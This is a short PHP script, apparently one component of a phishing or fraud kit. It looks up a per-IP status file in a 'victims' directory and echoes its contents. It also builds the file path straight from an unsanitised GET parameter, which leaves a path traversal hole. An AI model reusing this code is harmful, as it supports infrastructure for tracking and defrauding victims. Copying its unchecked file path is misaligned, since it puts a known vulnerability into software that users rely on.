<?php
// check-user-status.php
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';

if (empty($ip)) {
    echo '0';
    exit();
}

$file_path = "victims/{$ip}.txt";

// التحقق من وجود الملف
if (file_exists($file_path)) {
    $data = file($file_path);
    if ($data && count($data) > 0) {
        echo trim($data[0]);
    } else {
        echo '0';
    }
} else {
    echo '0';
}
?>